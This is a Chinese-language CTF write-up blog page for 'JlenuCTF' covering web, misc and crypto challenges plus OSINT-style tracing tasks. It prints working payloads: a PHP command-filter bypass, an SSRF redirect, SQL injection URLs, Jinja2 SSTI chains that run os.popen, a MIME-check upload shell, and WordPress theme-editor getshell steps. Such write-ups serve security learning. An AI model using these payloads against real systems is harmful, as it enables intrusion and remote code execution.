@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"right","width":200,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+
+
+<link rel="canonical" href="http://example.com/2023/12/25/JlenuCTF/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/12/25/JlenuCTF/","path":"2023/12/25/JlenuCTF/","title":"JIenuCTF"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>JIenuCTF | Y0ng's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Y0ng's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#easy-login-web"><span class="nav-text">easy_login(web)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#BDE-CAT-web"><span class="nav-text">BDE_CAT(web)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Easy-SSRF-web"><span class="nav-text">Easy_SSRF(web)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Strange-SQLI-web"><span class="nav-text">Strange_SQLI(web)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MIAOHUB-web"><span class="nav-text">MIAOHUB(web)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CMS-audit-web"><span class="nav-text">CMS_audit(web)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#warm-up-misc"><span class="nav-text">warm-up(misc)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MY-XP-misc"><span class="nav-text">MY XP(misc)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WHATS-HAPPEN-CRYPTO"><span class="nav-text">WHATS HAPPEN?(CRYPTO)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SIMPIOT-HAPPYGAME"><span class="nav-text">SIMPIOT(HAPPYGAME)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%A4%BE%E5%B7%A5%E4%B8%80"><span class="nav-text">社工一</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%A4%BE%E5%B7%A5%E4%BA%8C"><span class="nav-text">社工二</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%A4%BE%E5%B7%A5%E4%B8%89"><span class="nav-text">社工三</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%A4%BE%E5%B7%A5%E5%9B%9B"><span class="nav-text">社工四</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%A4%BE%E5%B7%A5%E4%BA%94"><span class="nav-text">社工五</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Y0ng</p>
+  <div class="site-description" itemprop="description">花有重开日，人无再少年</div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/25/JlenuCTF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Y0ng">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng's Blog">
+      <meta itemprop="description" content="花有重开日，人无再少年">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="JIenuCTF | Y0ng's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          JIenuCTF
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-12-25 00:41:11" itemprop="dateCreated datePublished" datetime="2023-12-25T00:41:11+08:00">2023-12-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E8%B5%9B%E9%A2%98wp/" itemprop="url" rel="index"><span itemprop="name">赛题wp</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="easy-login-web"><a href="#easy-login-web" class="headerlink" title="easy_login(web)"></a>easy_login(web)</h1><p>首先看网页源码，发现一段加密密钥</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/20210521202932486.png"></p>
+<a id="more"></a>
+
+<p>又看到有两个js文件是来自平台的，其他文件指向官网，下载两个文件</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/20210521202617198.png"></p>
+<p>找到一段加密函数，看到用的是ECB 方式</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_etd2</span>(<span class="params">_p0, _p1</span>) </span>&#123;</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">               <span class="keyword">var</span> _p2 = CryptoJS.AES.encrypt(_p0, CryptoJS.enc.Utf8.parse(_p1),&#123;</span><br><span class="line">                   mode: CryptoJS.mode.ECB,</span><br><span class="line">                   padding: CryptoJS.pad.Pkcs7</span><br><span class="line">                 &#125;).toString();   </span><br><span class="line">               $(<span class="string">&quot;#casLoginForm&quot;</span>).find(<span class="string">&quot;#passwordEncrypt&quot;</span>).val(_p2);</span><br><span class="line">           &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">               $(<span class="string">&quot;#casLoginForm&quot;</span>).find(<span class="string">&quot;#passwordEncrypt&quot;</span>).val(_p0);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
+
+<p>抓包验证一下，直接出密码，接下来就是爆破密码，加密，爆破发送<br><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/20210521203032484.png"></p>
+<p>关键是使用bp中的插件：，插件名称：BurpCrypto</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/2021052322340685.png"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/20210523223454333.png"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/20210523223330664.png"></p>
+<hr>
+<h1 id="BDE-CAT-web"><a href="#BDE-CAT-web" class="headerlink" title="BDE_CAT(web)"></a>BDE_CAT(web)</h1><p>开局一张猫<br><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/20210520085711351.png"></p>
+<p>查看源码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&#39;cat.jpg&#39; height&#x3D;400&gt;&lt;!-- is_debug --&gt;</span><br></pre></td></tr></table></figure>
+
+<p>访问?is_debug 得到源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$message</span> = <span class="string">&quot;&lt;img src=&#x27;cat.jpg&#x27; height=400&gt;&lt;!-- is_debug --&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;is_debug&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>) <span class="keyword">and</span> <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$qs</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!(substr_count(<span class="variable">$qs</span>, <span class="string">&#x27;_&#x27;</span>) &gt; <span class="number">0</span>) &amp;&amp; !(substr_count(<span class="variable">$qs</span>, <span class="string">&#x27;%&#x27;</span>)&gt; <span class="number">1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c_m_d&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/(\||&amp;;| |\/|cat|flag&#x27;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">        system(<span class="string">&quot;/sandboxed_bin/&quot;</span>.<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$message</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$message</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>$_SERVER[&#39;QUERY_STRING&#39;]</code> 意思：</p>
+<p><a target="_blank" rel="noopener" href="http://localhost/aaa/?p=222">http://localhost/aaa/?p=222</a> </p>
+<p>结果：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_SERVER[&#39;QUERY_STRING&#39;] &#x3D; &quot;p&#x3D;222&quot;;</span><br><span class="line">$_SERVER[&#39;REQUEST_URI&#39;]  &#x3D; &quot;&#x2F;aaa&#x2F;?p&#x3D;222&quot;;</span><br><span class="line">$_SERVER[&#39;SCRIPT_NAME&#39;]  &#x3D; &quot;&#x2F;aaa&#x2F;index.php&quot;;</span><br><span class="line">$_SERVER[&#39;PHP_SELF&#39;]     &#x3D; &quot;&#x2F;aaa&#x2F;index.php&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>查询的不能含有 <code>_</code>和 <code>%</code></p>
+<p>且只有get <code>c_m_d</code>才能执行system</p>
+<p>php解析特性可以使用<code>+</code> 和<code>.</code>和代替成 <code>_</code></p>
+<p><code>/sandboxed_bin/</code> 后面可以拼接 cat</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c.m.d&#x3D;???+????.???</span><br></pre></td></tr></table></figure>
+
+<p>flag: JlenuCTF{hPHPPP_c@t_Bypass}</p>
+<hr>
+<h1 id="Easy-SSRF-web"><a href="#Easy-SSRF-web" class="headerlink" title="Easy_SSRF(web)"></a>Easy_SSRF(web)</h1><p>先看一下网页源码</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/20210522165752373.png"></p>
+<p>经过测试，服务器上搭建一个302跳转页面 或者 直接生成个</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php%E7%9A%84%E7%9F%AD%E9%93%BE%E6%8E%A5%E6%89%93%E8%BF%87%E5%8E%BB%E5%B0%B1%E8%A1%8C%E4%BA%86">http://127.0.0.1/flag.php的短链接打过去就行了</a></p>
+<p>1.php:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">header(<span class="string">&quot;Location:http://127.0.0.1/flag.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;120.79.25.56:5566&#x2F;?url&#x3D;http:&#x2F;&#x2F;x.x.x.x&#x2F;1.php</span><br></pre></td></tr></table></figure>
+
+<p>flag: JlenuCTF{ssrf_is_so_esay!}</p>
+<hr>
+<h1 id="Strange-SQLI-web"><a href="#Strange-SQLI-web" class="headerlink" title="Strange_SQLI(web)"></a>Strange_SQLI(web)</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php?id&#x3D;1%20And%201&#x3D;1--+</span><br><span class="line">index.php?id&#x3D;0%20union%20select%20database()   &#x2F;&#x2F;  jlenu_ctf</span><br></pre></td></tr></table></figure>
+<p>测了几次整形注入发现有时候对的也会报错，而且好像还是有规律的报错，导致我不能确定到底是不是过滤，索性直接猜表 和字段，真猜出来了<br><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/20210522092405584.png"></p>
+<p>后来hint：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">题目有个动态随机waf用来防止sqlmap，如单条语句无法回显，请多试几次</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="MIAOHUB-web"><a href="#MIAOHUB-web" class="headerlink" title="MIAOHUB(web)"></a>MIAOHUB(web)</h1><p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/20210522080731326.png"></p>
+<p>以为是文件上传，谁知道是SSTI？？？</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/20210522092815245.png"></p>
+<p>flask 2.0</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/202105220929510.png"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/20210522093007215.png"></p>
+<p>发现注入点</p>
+<p>查看config：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/20210522184438512.png"></p>
+<p>测了一下，过滤 <code>.</code> 和<code>[ ]</code></p>
+<p>attr()就行了，多亏了这篇文章，让我又学习了一点SSTI的bypass</p>
+<p><a target="_blank" rel="noopener" href="https://hackmd.io/@Chivato/HyWsJ31dI">Jinja2 SSTI Research</a></p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;request|attr(&#39;application&#39;)|attr(&#39;\x5f\x5fglobals\x5f\x5f&#39;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fbuiltins\x5f\x5f&#39;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fimport\x5f\x5f&#39;)(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;id&#39;)|attr(&#39;read&#39;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>或者</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;config|attr(&#39;__class__&#39;)|attr(&#39;__init__&#39;)|attr(&#39;__globals__&#39;)|attr(&#39;__getitem__&#39;)(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;ls&#39;)|attr(&#39;read&#39;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>flag: Jlenu{MiaohUB_SO_CUTE!!!!}</p>
+<hr>
+<h1 id="CMS-audit-web"><a href="#CMS-audit-web" class="headerlink" title="CMS_audit(web)"></a>CMS_audit(web)</h1><p>弱密码登录</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/20210522212123629.png"><br>漏洞位置：上传LOGO</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">controller\CallAction.class.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upLoad</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;send&#x27;</span>])) &#123;</span><br><span class="line">			<span class="variable">$_logoupload</span> = <span class="keyword">new</span> LogoUpload(<span class="string">&#x27;pic&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;MAX_FILE_SIZE&#x27;</span>]);</span><br><span class="line">			<span class="variable">$_path</span> = <span class="variable">$_logoupload</span>-&gt;getPath();</span><br><span class="line">			<span class="variable">$_img</span> = <span class="keyword">new</span> Image(<span class="variable">$_path</span>);</span><br><span class="line">			<span class="variable">$_img</span>-&gt;xhImg(<span class="number">960</span>,<span class="number">0</span>);</span><br><span class="line">			<span class="variable">$_img</span>-&gt;out();</span><br><span class="line">			<span class="comment">//echo $_path;</span></span><br><span class="line">			<span class="variable">$_logoupload</span>-&gt;alertOpenerClose(<span class="string">&#x27;图片上传成功！&#x27;</span>,<span class="string">&#x27;..&#x27;</span>.<span class="variable">$_path</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">exit</span>(<span class="string">&#x27;警告：文件过大或者其他未知错误导致浏览器崩溃！&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>跟进LogoUpload类,看到验证类型</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//验证类型</span></span><br><span class="line">	<span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">checkType</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (!in_array(<span class="keyword">$this</span>-&gt;type,<span class="keyword">$this</span>-&gt;typeArr)) &#123;</span><br><span class="line">			Tool::alertBack(<span class="string">&#x27;警告：不合法的上传类型！&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>跟进,只判断类型</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private $typeArr &#x3D; array(&#39;image&#x2F;jpeg&#39;,&#39;image&#x2F;pjpeg&#39;,&#39;image&#x2F;png&#39;,&#39;image&#x2F;x-png&#39;,&#39;image&#x2F;gif&#39;);		&#x2F;&#x2F;类型合集</span><br></pre></td></tr></table></figure>
+
+<p>上传shell<br><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/2021052221333721.png"></p>
+<p>flag: Jlenu{GOOD_Y0U_Are_HACKED!!!}</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/0daybug/p/12932677.html">YCCMS代码审计(新手教学方向)</a></p>
+<hr>
+<h1 id="warm-up-misc"><a href="#warm-up-misc" class="headerlink" title="warm-up(misc)"></a>warm-up(misc)</h1><p>直接查看源码，发现flag，unicode解码<br><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/20210520091213598.png"><br>flag: JlenuCTF{Y0u_ArE_HOrse_killER}</p>
+<hr>
+<h1 id="MY-XP-misc"><a href="#MY-XP-misc" class="headerlink" title="MY XP(misc)"></a>MY XP(misc)</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;volatility -f 111.vmem imageinfo  &#x2F;&#x2F;imageinfo:查询对应镜像文件的系统信息</span><br></pre></td></tr></table></figure>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/20210521175359434.png"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;volatility -f 111.vmem --profile&#x3D;WinXPSP2x86 psscan  &#x2F;&#x2F;查看进程</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/20210521180608939.png"></p>
+<blockquote>
+<p>./volatility -f 111.vmem –profile=WinXPSP2x86 filescan |grep -E ‘jpg|png|jpeg|bmp|gif|zip|txt’  //查找文件</p>
+</blockquote>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/2021052118115260.png"></p>
+<blockquote>
+<p>./volatility -f 111.vmem –profile=WinXPSP2x86 dumpfiles -Q 0x0000000001d27bf0 –dump-dir=./   //dump文件</p>
+</blockquote>
+<p>打开发现base64，解码即可</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/20210521181258560.png"></p>
+<p>flag: JlenuCTF{You_ArE_F1nd_mY_XPPPP}</p>
+<hr>
+<h1 id="WHATS-HAPPEN-CRYPTO"><a href="#WHATS-HAPPEN-CRYPTO" class="headerlink" title="WHATS HAPPEN?(CRYPTO)"></a>WHATS HAPPEN?(CRYPTO)</h1><p>直接盲文比对</p>
+<p>flag: JlenuCTF{BLINDNEEDHELP}</p>
+<hr>
+<h1 id="SIMPIOT-HAPPYGAME"><a href="#SIMPIOT-HAPPYGAME" class="headerlink" title="SIMPIOT(HAPPYGAME)"></a>SIMPIOT(HAPPYGAME)</h1><p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/20210520092237463.png"><br>flag: JlenuCTF{ha-easyy-iOt}</p>
+<hr>
+<hr>
+<h1 id="社工一"><a href="#社工一" class="headerlink" title="社工一"></a>社工一</h1><p>描述：</p>
+<ul>
+<li>魔法少女所维护的网站被黑客攻击了，你是魔法少女请过来的外援大佬，希望你能够帮助魔法少女来进行溯源找到黑客，已知魔法少女对网站进行了备份，加油。 找到后门文件，将黑客id直接提交至平台，无需包装<br>D盾发现后门文件</li>
+</ul>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/20210520093704613.png"></p>
+<p>flag: HSYM</p>
+<p>蚁剑连上</p>
+<hr>
+<h1 id="社工二"><a href="#社工二" class="headerlink" title="社工二"></a>社工二</h1><p>描述</p>
+<ul>
+<li>很好，你已经找到了黑客的id，请继续溯源，寻找黑客的代理服务器的ip 将代理服务器ip直接提交</li>
+</ul>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/2021052209450794.png"></p>
+<hr>
+<h1 id="社工三"><a href="#社工三" class="headerlink" title="社工三"></a>社工三</h1><p>描述：</p>
+<ul>
+<li>非常棒，既然你已经找到了黑客的服务器，尝试访问，并找出他的博客后台密码 找出黑客的博客后台密码，直接提交</li>
+</ul>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/20210522094730894.png"></p>
+<p>账号：<a href="mailto:&#x53;&#x31;&#49;&#x34;&#53;&#x31;&#x34;&#87;&#64;&#x70;&#x72;&#x6f;&#116;&#111;&#x6e;&#109;&#x61;&#105;&#108;&#x2e;&#x63;&#x6f;&#109;">&#x53;&#x31;&#49;&#x34;&#53;&#x31;&#x34;&#87;&#64;&#x70;&#x72;&#x6f;&#116;&#111;&#x6e;&#109;&#x61;&#105;&#108;&#x2e;&#x63;&#x6f;&#109;</a><br>密码：HSYM20020301</p>
+<hr>
+<h1 id="社工四"><a href="#社工四" class="headerlink" title="社工四"></a>社工四</h1><p>描述：</p>
+<ul>
+<li>good，该找的都找得差不多了黑客的邮箱里面可能会有些好东西哦 找出黑客的真实地理位置，地理位置名称提交</li>
+<li>先拿shell，然后找邮箱配置备份文件</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ssw6/p/12668000.html">wordpress getshell总结</a></p>
+<p>进入后台，在外观处写shell<br><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/2021052212334876.png"><br>路径：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.15.98.31&#x2F;wp-admin&#x2F;theme-editor.php?file&#x3D;upload.php&amp;theme&#x3D;CorePressWPTheme-main</span><br><span class="line">&#x2F;&#x2F;CorePressWPTheme-main为主题名</span><br><span class="line"></span><br><span class="line">url+&#x2F;wp-content&#x2F;themes&#x2F;+主题名&#x2F;+修改文件的文件名</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑后</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/20210523223843510.png"></p>
+<p>使用密码登录邮箱，看到一张照片，下载下来</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/2021052322482633.png"></p>
+<p>发现GPS</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/20210523224801274.png"></p>
+<p>先转换：</p>
+<p><a target="_blank" rel="noopener" href="http://minigps.net/fc.html">转换地址</a></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/20210523231645612.png"></p>
+<p>在查找：</p>
+<p><a target="_blank" rel="noopener" href="http://www.metools.info/learn/location201.html">查找地址</a><br><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/20210523231619390.png"></p>
+<hr>
+<h1 id="社工五"><a href="#社工五" class="headerlink" title="社工五"></a>社工五</h1><p>描述：</p>
+<ul>
+<li>非常棒，抓到他。 找到黑客的身份证号，直接提交</li>
+</ul>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/20210523231106490.png"></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
